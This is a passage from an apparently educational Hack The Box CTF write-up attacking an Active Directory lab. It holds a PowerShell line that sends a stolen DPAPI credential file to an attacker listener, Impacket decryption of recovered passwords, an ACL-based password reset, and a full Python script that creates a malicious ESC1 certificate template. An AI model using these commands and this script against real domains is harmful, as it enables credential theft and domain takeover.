PS C:\Windows\System32> $p='C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('10.10.17.133',6666);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()
$p='C:\Users\noah.b\AppData\Roaming\Microsoft\Credentials\57FFB67D684C67F09E7153B9C7CC3940';$b=[IO.File]::ReadAllBytes($p);$c=[Net.Sockets.TcpClient]::new('10.10.17.133',6666);$s=$c.GetStream();$s.Write($b,0,$b.Length);$s.Close();$c.Close()
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ nc -lvnp 6666 > f53fcaba-f057-48e8-8f92-0180d274bf0f
listening on [any] 6666 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.16.1] 64216
                                                                                                       
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ nc -lvnp 6666 > 57FFB67D684C67F09E7153B9C7CC3940
listening on [any] 6666 ...
connect to [10.10.17.133] from (UNKNOWN) [10.129.16.1] 64226
```

Now for the actual DPAPI decryption, we lean on Impacket's `dpapi` helper. First, we unlock the master key itself. Since a master key protected by a domain user's logon password is derived using that user's **NT hash** (the MD4 of the password, which is exactly what Windows authentication itself uses internally), simply supplying `noah.b`'s known plaintext password is enough for Impacket to recompute that same derivation and recover the raw master key:

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ impacket-dpapi masterkey -file f53fcaba-f057-48e8-8f92-0180d274bf0f -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' -password 'RiverDragon#Storm25'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : f53fcaba-f057-48e8-8f92-0180d274bf0f
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000000 (0)
DomainKeyLen: 000001ac (428)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
```

`Decrypted key with User Key (MD4 protected)` is Impacket confirming exactly the mechanism just described: it derived the key-encryption-key straight from the NT hash of `noah.b`'s password and used it to unwrap the real, random master key inside the file — the long hex string is that recovered master key, now completely in the clear.

With the master key recovered, decrypting the actual Credential Manager blob is now a one-liner — feed it the same master key and the encrypted credential file, and Impacket reverses the final layer of DPAPI encryption to hand back the stored secret in plaintext:

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ impacket-dpapi credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9adb3b8ccd8901bf9e2a29afabcbbcbdb5a13a24a1817bda49097c7ff3c8e5d71f34ae43850a136dc64dbd37061d4f9c34bdbdca21aa8af57d26baad0d8
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2026-03-27 22:03:38+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PC01.danglingtree.htb
Description : 
Unknown     : 
Username    : alex.o
Unknown     : SunsetMountainPeak@2025
```

And there it is, sitting in plaintext: `alex.o`'s real password, `SunsetMountainPeak@2025`, saved by Windows itself months ago as a convenience the day someone typed it into a login prompt for `PC01` and checked "remember me." This is the real lesson of this phase, and it's a big "ohh" moment: **knowing a user's plaintext password doesn't just let you log in as them — it silently hands you every other credential Windows has ever cached on their behalf, for any account, going back as far as their credential history retains it.** `noah.b` never needed to be careless with `alex.o`'s password directly; Windows' own convenience feature did the leaking for us, the moment we owned the account whose password happened to unlock the vault.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc smb DC.danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025'
SMB         10.129.47.38   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.47.38   445    DC               [+] danglingtree.htb\alex.o:SunsetMountainPeak@2025
```

I restarted my machine instance here that's why the target IP has changed

That's a normal HTB housekeeping note — restarting a machine instance issues a fresh IP address, which is why the DC's address shifts from `10.129.47.38` to `10.129.47.118` for the remainder of this writeup. Same box, same domain, same attack chain — just a new lease.

With `alex.o`'s credentials confirmed working, this is exactly the moment to open up the BloodHound data we collected as `noah.b` and mark our currently-owned principals, then ask BloodHound the one question that matters: **"what can I reach from here?"**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F653lKVUVAxA4XyEynZRe%252FScreenshot%2520%283423%29.png%3Falt%3Dmedia%26token%3De2bbdd31-9ca6-48cc-ad9f-c04382b2fd42&width=768&dpr=3&quality=100&sign=669bd29749c196d6e746dd2faee7adf2&sv=3)

This first graph is the payoff for having run a full collection: BloodHound renders `alex.o` as a node with an outbound edge pointing at another account — the kind of ACL relationship (things like `GenericWrite`, `GenericAll`, or `ForceChangePassword`) that never shows up in a normal `net user` or LDAP dump, because it isn't a group membership at all. It's a permission granted directly on one user object, allowing `alex.o` to modify specific attributes of the target account — including, as we're about to use, resetting that account's password outright.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F7Nr0ydVyyaFyVAYgmySH%252FScreenshot%2520%283424%29.png%3Falt%3Dmedia%26token%3Da9279a93-c3b3-47de-886a-8bad30e37c41&width=768&dpr=3&quality=100&sign=391cc6280cdce31cf4831a91a3e8160e&sv=3)

Clicking that edge in BloodHound normally opens an **"Abuse Info"** panel — this is one of BloodHound's most underrated features for newcomers. It doesn't just tell you an edge *exists*; it explains in plain English what the underlying Windows permission actually grants, and typically hands you the exact command-line syntax (using tools like `bloodyAD`, PowerView, or `net rpc`) needed to abuse it right then and there. This screenshot is BloodHound confirming that the edge we're looking at is abusable specifically as a password reset.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgFRKZA8Gmg3navcXMvSs%252FScreenshot%2520%283425%29.png%3Falt%3Dmedia%26token%3D5cbe1c88-778a-43ff-903f-549431f1065a&width=768&dpr=3&quality=100&sign=09260b4b1589d2c3afb17609746638d4&sv=3)

And this third view zooms out to show where that target account sits in the bigger picture — its own group memberships and further outbound rights, which is exactly what tells us *why* it's worth taking over at all rather than being a dead-end account like `anderson.w` was. Put together, these three screenshots tell a complete story: `alex.o` can reset the password of a user who, in turn, holds real, structurally important rights elsewhere in the domain (as we'll see, over the certificate template infrastructure itself).

Armed with that graph knowledge, we use **bloodyAD** — a Python-based Active Directory manipulation tool built specifically around abusing exactly these kinds of ACL edges — to reset that target account's password as `alex.o`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ bloodyAD --host DC.danglingtree.htb -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' set password JAKE.H 'Password123!'
[+] Password changed successfully!
```

That confirms it: the account BloodHound pointed us at is `jake.h`. Let's verify the new credentials work:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc smb DC.danglingtree.htb -u JAKE.H -p Password123!
SMB         10.129.47.118   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.47.118   445    DC               [+] danglingtree.htb\JAKE.H:Password123! 
```

## Part IV — ADCS Exploitation and Domain Compromise

### Phase 13: ADCS Enumeration — Spotting ESC7

Now that we're `jake.h`, it's time to point **Certipy** — the definitive tool for ADCS misconfiguration hunting — at the domain's Certificate Authority and see exactly what's abusable:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc ldap DC.danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' -M adcs
LDAP        10.129.47.118   389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never)                                                                                         
ADCS        10.129.47.118   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.47.118   389    DC               Found PKI Enrollment Server: dc.danglingtree.htb
ADCS        10.129.47.118   389    DC               Found CN: danglingtree-DC-CA
```

Before going further, let's take a step back and quickly ground what ADCS abuse actually is, since the rest of this box hinges entirely on it. **Active Directory Certificate Services** lets domain users request X.509 certificates from an internal Certificate Authority for things like smart-card logon, TLS, or — most relevant to us — **client authentication**: a certificate that can be presented *instead of a password* to authenticate as whatever identity is embedded in it. Researchers (most notably in the original "Certified Pre-Owned" whitepaper) catalogued a whole family of common misconfigurations, nicknamed **ESC1 through ESC15+**, where a badly configured certificate template or CA lets an attacker obtain a certificate that authenticates as someone else entirely — up to and including Domain Admin. Certipy's whole purpose is to automatically spot which of these specific misconfiguration patterns exist in a given environment.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad find -target DC.danglingtree.htb -u JAKE.H -p Password123! -stdout -vulnerable -dc-ip 10.129.47.118
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'danglingtree-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'danglingtree-DC-CA'
[*] Checking web enrollment for CA 'danglingtree-DC-CA' @ 'dc.danglingtree.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : danglingtree-DC-CA
    DNS Name                            : dc.danglingtree.htb
    Certificate Subject                 : CN=danglingtree-DC-CA, DC=danglingtree, DC=htb
    Certificate Serial Number           : 6E77D503246E55B34D28C464F186BD4B
    Certificate Validity Start          : 2026-08-03 16:32:49+00:00
    Certificate Validity End            : 2126-08-03 16:42:49+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DANGLINGTREE.HTB\Administrators
      Access Rights
        Enroll                          : DANGLINGTREE.HTB\Authenticated Users
        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
        ManageCa                        : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Administrators
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Authenticated Users
    [+] User ACL Principals             : DANGLINGTREE.HTB\Helpdesk_Cert_Support
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

Even though the templates section comes up empty for now, the CA-level finding is already significant: **`ESC7`**, flagged because the custom `Helpdesk_Cert_Support` group holds **`ManageCertificates`** rights directly on the Certificate Authority object. `ManageCertificates` lets its holder approve or deny pending certificate requests and manage already-issued certificates — in the classic ESC7 attack, a holder of this right (often combined with `ManageCa`) can issue themselves a certificate for an arbitrary identity by manipulating the request/issuance process directly, bypassing whatever restrictions a template would normally enforce. We don't have `Helpdesk_Cert_Support` membership yet, but this confirms the CA's permission model is already loosely configured — a pattern that continues at the template level, as we're about to find.

Let's check `jake.h`'s own group memberships to understand what he actually controls:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ nxc ldap DC.danglingtree.htb -u JAKE.H -p Password123! --groups
LDAP        10.129.47.118   389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:danglingtree.htb) (signing:Enforced) (channel binding:Never)                                                                                         
LDAP        10.129.47.118   389    DC               [+] danglingtree.htb\JAKE.H:Password123! 
LDAP        10.129.47.118   389    DC               -Group-                                  -Members- -Description-              
LDAP        10.129.47.118   389    DC               Administrators                           3         Administrators have complete and unrestricted access to the computer/domain                                                                                  
LDAP        10.129.47.118   389    DC               Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications                                                  
LDAP        10.129.47.118   389    DC               Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted                               
LDAP        10.129.47.118   389    DC               Print Operators                          0         Members can administer printers installed on domain controllers                                                                                              
LDAP        10.129.47.118   389    DC               Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files                                                    
LDAP        10.129.47.118   389    DC               Replicator                               0         Supports file replication in a domain                                                                                                                        
LDAP        10.129.47.118   389    DC               Remote Desktop Users                     2         Members in this group are granted the right to logon remotely                                                                                                
LDAP        10.129.47.118   389    DC               Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features                                                 
LDAP        10.129.47.118   389    DC               Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely                                                                               
LDAP        10.129.47.118   389    DC               Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer                                                                                                                       
LDAP        10.129.47.118   389    DC               Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.                                                                     
LDAP        10.129.47.118   389    DC               IIS_IUSRS                                0         Built-in group used by Internet Information Services.                                                                                                        
LDAP        10.129.47.118   389    DC               Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.                                                                                                  
LDAP        10.129.47.118   389    DC               Event Log Readers                        0         Members of this group can read event logs from local machine                                                                                                 
LDAP        10.129.47.118   389    DC               Certificate Service DCOM Access          1         Members of this group are allowed to connect to Certification Authorities in the enterprise                                                                  
LDAP        10.129.47.118   389    DC               RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.                                               
LDAP        10.129.47.118   389    DC               RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.                                                                                                             
LDAP        10.129.47.118   389    DC               RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.   
LDAP        10.129.47.118   389    DC               Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.                                                                      
LDAP        10.129.47.118   389    DC               Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.                                            
LDAP        10.129.47.118   389    DC               Remote Management Users                  3         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.                                                                                 
LDAP        10.129.47.118   389    DC               Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.                                                              
LDAP        10.129.47.118   389    DC               OpenSSH Users                            0         Members of this group may connect to this computer using SSH.                                                                                                
LDAP        10.129.47.118   389    DC               Domain Computers                         0         All workstations and servers joined to the domain                                                                                                            
LDAP        10.129.47.118   389    DC               Domain Controllers                       0         All domain controllers in the domain                                                                                                                         
LDAP        10.129.47.118   389    DC               Schema Admins                            1         Designated administrators of the schema                                                                                                                      
LDAP        10.129.47.118   389    DC               Enterprise Admins                        1         Designated administrators of the enterprise                                                                                                                  
LDAP        10.129.47.118   389    DC               Cert Publishers                          1         Members of this group are permitted to publish certificates to the directory                                                                                 
LDAP        10.129.47.118   389    DC               Domain Admins                            1         Designated administrators of the domain                                                                                                                      
LDAP        10.129.47.118   389    DC               Domain Users                             0         All domain users
LDAP        10.129.47.118   389    DC               Domain Guests                            0         All domain guests
LDAP        10.129.47.118   389    DC               Group Policy Creator Owners              1         Members in this group can modify group policy for the domain                                                                                                 
LDAP        10.129.47.118   389    DC               RAS and IAS Servers                      0         Servers in this group can access remote access properties of users                                                                                           
LDAP        10.129.47.118   389    DC               Server Operators                         0         Members can administer domain servers                                                                                                                        
LDAP        10.129.47.118   389    DC               Account Operators                        0         Members can administer domain user and group accounts                                                                                                        
LDAP        10.129.47.118   389    DC               Pre-Windows 2000 Compatible Access       2         A backward compatibility group which allows read access on all users and groups in the domain                                                                
LDAP        10.129.47.118   389    DC               Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest                                                                                     
LDAP        10.129.47.118   389    DC               Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects                                                    
LDAP        10.129.47.118   389    DC               Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage                                                                                                                    
LDAP        10.129.47.118   389    DC               Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain                                                  
LDAP        10.129.47.118   389    DC               Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain                                               
LDAP        10.129.47.118   389    DC               Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain                                                                                         
LDAP        10.129.47.118   389    DC               Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise                                                                                     
LDAP        10.129.47.118   389    DC               Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.                                                                                             
LDAP        10.129.47.118   389    DC               Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.                                                                                                                     
LDAP        10.129.47.118   389    DC               Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.                                                                   
LDAP        10.129.47.118   389    DC               Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.                                                                   
LDAP        10.129.47.118   389    DC               Forest Trust Accounts                    0         All forest trust accounts in the forest.                                                                                                                     
LDAP        10.129.47.118   389    DC               External Trust Accounts                  0         All external trust accounts in the domain.                                                                                                                   
LDAP        10.129.47.118   389    DC               DnsAdmins                                0         DNS Administrators Group
LDAP        10.129.47.118   389    DC               DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).                                             
LDAP        10.129.47.118   389    DC               Cert_Managers                            0         
LDAP        10.129.47.118   389    DC               Helpdesk_Cert_Support                    1         
LDAP        10.129.47.118   389    DC               Template_Editors                         1         
LDAP        10.129.47.118   389    DC               DevOps_PKI                               1         
LDAP        10.129.47.118   389    DC               Windows Admin Center CredSSP             0         Members of CredSSP operations                                                                                                                                
LDAP        10.129.47.118   389    DC               support-it                               1
```

This is a standard "list every group in the domain and how many members it has" dump rather than a per-user membership list, but it earns its place here for one reason: it confirms **`Helpdesk_Cert_Support`, `Template_Editors`, and `DevOps_PKI` each have exactly one member.** Given everything we've built up to this point — `jake.h` freshly compromised via `alex.o`'s ACL rights, and ADCS clearly central to this box — the natural read is that `jake.h` is that lone member of one or more of these PKI-delegation groups, which is exactly what unlocks the next phase: direct control over certificate template objects in the directory.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fp2lAKJaEnw1vYSbkCg9w%252FScreenshot%2520%283426%29.png%3Falt%3Dmedia%26token%3D7eac8da3-85ed-4c9b-aa0d-98749407214c&width=768&dpr=3&quality=100&sign=0f762113defe7f665467b037abf85996&sv=3)

Loading the domain into BloodHound directly and pulling up `jake.h`'s node visually confirms the same story the raw group dump only hinted at: his outbound edges tie him directly into the PKI delegation groups and, from there, into meaningful control over specific certificate template objects — turning what looked like a plain compromised user account into someone who can reshape how the CA issues certificates entirely.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ certipy-ad find -target DC.danglingtree.htb -u JAKE.H -p Password123! -stdout -dc-ip 10.129.47.118 | grep -i ManageCertificate
Certipy v5.1.0 - by Oliver Lyak (ly4k)

        ManageCertificates              : DANGLINGTREE.HTB\Helpdesk_Cert_Support
```

That one-line `grep` is just re-confirming the ESC7-relevant permission we already noted — `Helpdesk_Cert_Support` (which, per the graph, includes `jake.h`) really does hold `ManageCertificates` on the CA. But rather than walking the fiddly, multi-step ESC7 "issue a pending request as an approver" path, the operator here goes a different — and arguably more instructive — route: building a **brand-new, fully attacker-controlled certificate template from scratch.**

### Phase 14: Building a Malicious Certificate Template from Scratch

```python
import argparse
import secrets
import ssl
import struct

from impacket.ldap import ldaptypes
from ldap3 import ALL, BASE, MODIFY_REPLACE, SUBTREE, Connection, Server, SIMPLE, Tls
from ldap3.protocol.microsoft import security_descriptor_control


EKU_CLIENT_AUTH = "1.3.6.1.5.5.7.3.2"


def abort(conn, step):
    raise SystemExit(f"[-] {step}: {conn.result}")


def build_ace(sid_str, access_mask):
    ace_obj = ldaptypes.ACE()
    ace_obj["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    ace_obj["AceFlags"] = 0
    ace_obj["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
    ace_obj["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
    ace_obj["Ace"]["Mask"]["Mask"] = access_mask
    ace_obj["Ace"]["Sid"] = ldaptypes.LDAP_SID()
    ace_obj["Ace"]["Sid"].fromCanonical(sid_str)
    return ace_obj


def build_sd(owner_sid):
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 0x9C04
    sd["OwnerSid"] = ldaptypes.LDAP_SID()
    sd["OwnerSid"].fromCanonical(owner_sid)
    sd["GroupSid"] = b""
    sd["Sacl"] = b""

    sd["Dacl"] = ldaptypes.ACL()
    sd["Dacl"]["AclRevision"] = 2
    sd["Dacl"]["Sbz1"] = 0
    sd["Dacl"]["Sbz2"] = 0
    sd["Dacl"].aces = [
        build_ace(owner_sid, 983551),
        build_ace("S-1-5-11", 131220),
    ]
    return sd


cli = argparse.ArgumentParser(
    description="Provision a custom certificate template OID + object via LDAPS"
)
cli.add_argument("-H", "--host", required=True)
cli.add_argument("-u", "--user", required=True)
cli.add_argument("-p", "--password", required=True)
cli.add_argument("-t", "--template", default="EmployeeAuthTemplate")
opts = cli.parse_args()

tls_ctx = Tls(validate=ssl.CERT_NONE)
ldap_srv = Server(opts.host, port=636, use_ssl=True, tls=tls_ctx, get_info=ALL)
ldap_conn = Connection(
    ldap_srv,
    user=opts.user,
    password=opts.password,
    authentication=SIMPLE,
    auto_bind=True,
    check_names=False,
)

cfg_nc = ldap_srv.info.other["configurationNamingContext"][0]
oid_container = f"CN=OID,CN=Public Key Services,CN=Services,{cfg_nc}"
tmpl_container = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{cfg_nc}"
tmpl_dn = f"CN={opts.template},{tmpl_container}"

ldap_conn.search(tmpl_dn, "(objectClass=*)", BASE, attributes=["cn"])
already_present = bool(ldap_conn.entries)

if not already_present:
    ldap_conn.search(oid_container, "(objectClass=*)", BASE, attributes=["msPKI-Cert-Template-OID"])
    base_oid = ldap_conn.entries[0]["msPKI-Cert-Template-OID"].value

    ldap_conn.search(
        oid_container,
        "(objectClass=msPKI-Enterprise-Oid)",
        SUBTREE,
        attributes=["msPKI-Cert-Template-OID"],
    )
    oid_prefix = f"{base_oid}.1."
    used_idxs = []
    for e in ldap_conn.entries:
        oid_val = e["msPKI-Cert-Template-OID"].value
        if oid_val and oid_val.startswith(oid_prefix) and oid_val[len(oid_prefix):].isdigit():
            used_idxs.append(int(oid_val[len(oid_prefix):]))

    next_idx = max(used_idxs, default=0) + 1
    new_oid = f"{oid_prefix}{next_idx}"
    oid_name = f"{next_idx}.{secrets.token_hex(16).upper()}"
    oid_dn = f"CN={oid_name},{oid_container}"

    oid_attrs = {
        "objectClass": ["top", "msPKI-Enterprise-Oid"],
        "cn": oid_name,
        "displayName": opts.template,
        "flags": 1,
        "msPKI-Cert-Template-OID": new_oid,
    }

    if not ldap_conn.add(oid_dn, attributes=oid_attrs):
        abort(ldap_conn, "OID object creation")

    tmpl_attrs = {
        "objectClass": ["top", "pKICertificateTemplate"],
        "cn": opts.template,
        "displayName": opts.template,
        "instanceType": 4,
        "showInAdvancedViewOnly": True,
        "flags": 0,
        "revision": 1,
        "pKIDefaultKeySpec": 2,
        "pKIKeyUsage": b"\x86\x00",
        "pKIMaxIssuingDepth": -1,
        "pKICriticalExtensions": ["2.5.29.19", "2.5.29.15"],
        "pKIExpirationPeriod": struct.pack("<q", -315360000000000),
        "pKIOverlapPeriod": struct.pack("<q", -36288000000000),
        "pKIExtendedKeyUsage": [EKU_CLIENT_AUTH],
        "pKIDefaultCSPs": [
            "2,Microsoft Base Cryptographic Provider v1.0",
            "1,Microsoft Enhanced Cryptographic Provider v1.0",
        ],
        "msPKI-RA-Signature": 0,
        "msPKI-Enrollment-Flag": 0,
        "msPKI-Private-Key-Flag": 16,
        "msPKI-Certificate-Name-Flag": 1,
        "msPKI-Minimal-Key-Size": 2048,
        "msPKI-Template-Schema-Version": 1,
        "msPKI-Template-Minor-Revision": 1,
        "msPKI-Cert-Template-OID": new_oid,
    }

    if not ldap_conn.add(tmpl_dn, attributes=tmpl_attrs):
        ldap_conn.delete(oid_dn)
        abort(ldap_conn, "template object creation")

    print(f"[+] Created OID value: {new_oid}")
    print(f"[+] Created OID DN:    {oid_dn}")

sd_blob = build_sd("S-1-5-11").getData()
mods = {"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_blob])]}
sd_ctrl = security_descriptor_control(sdflags=0x04)
if not ldap_conn.modify(tmpl_dn, mods, controls=sd_ctrl):
    abort(ldap_conn, "security descriptor update")

print(f"[+] Template ready at: {tmpl_dn}")
print("[+] Authenticated Users now have full control on the template")
```

This script is worth unpacking properly, because it demonstrates something a lot of ADCS write-ups skip past: **certificate templates are just ordinary LDAP objects.** In Active Directory, every enrollable template lives as a `pKICertificateTemplate` object underneath `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...`, alongside a matching OID (Object Identifier) registration object under a sibling `CN=OID` container that gives the template its globally-unique identity string. Normally you'd manage all of this through the graphical Certificate Templates MMC console — but if a low-privileged account happens to have **create-object rights** on that container (which is precisely what a group named `Template_Editors` implies), nothing stops that account from doing exactly what a GUI wizard would do: **write the raw LDAP objects directly.**

Walking through what the script actually builds:

* It first computes a fresh, unused OID value by reading the container's base OID and incrementing past whatever indexes are already taken — mirroring how Windows itself allocates a new OID whenever an administrator creates a template through the real UI.
* It then creates the template object itself with a very deliberate set of attributes: `pKIExtendedKeyUsage` set to `1.3.6.1.5.5.7.3.2` (**Client Authentication** — the EKU that makes a certificate usable for logging in as a user, rather than just for something like TLS or code signing), `msPKI-Certificate-Name-Flag: 1` (this flag corresponds to **`ENROLLEE_SUPPLIES_SUBJECT`** — meaning whoever requests the certificate gets to specify *whose identity* the certificate should represent, rather than the CA deciding that automatically), `msPKI-Enrollment-Flag: 0` and `msPKI-RA-Signature: 0` (no manager approval required, no additional signatures needed before issuance), and `msPKI-Template-Schema-Version: 1` (an older template schema version with looser validation, relevant to the `ESC15`/CVE-2024-49019 issue flagged later).
* Finally, `build_sd()` constructs a raw Windows **security descriptor** byte blob by hand — using Impacket's `ldaptypes` module to build actual ACE (Access Control Entry) structures — and writes it straight into the template's `nTSecurityDescriptor` attribute. The access mask `983551` corresponds to **Full Control**, granted to whichever SID is passed in as `owner_sid`; `131220` is a more limited mask corresponding to **Enroll** rights, granted here to the well-known SID `S-1-5-11` — the built-in "**Authenticated Users**" group, meaning literally *any* logged-in domain account (not just `jake.h`) would be allowed to enroll for a certificate off this template once it's live.

In plain terms: this single script hands whoever runs it the ability to conjure an entirely new, fully self-controlled certificate template into existence — with exactly the dangerous combination of flags (`ENROLLEE_SUPPLIES_SUBJECT` + Client Authentication + no approval) that the ADCS research community named **ESC1** — purely because that account was allowed to write objects into a container most administrators assume only the CA software itself touches.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DanglingTree]
└─$ python3 creator.py -H DC.danglingtree.htb -u JAKE.H -p Password123! -t EmployeeAuthTemplate
[+] Created OID value: 1.3.6.1.4.1.311.21.8.13218431.14779392.10764427.12370424.10671376.174.1.403
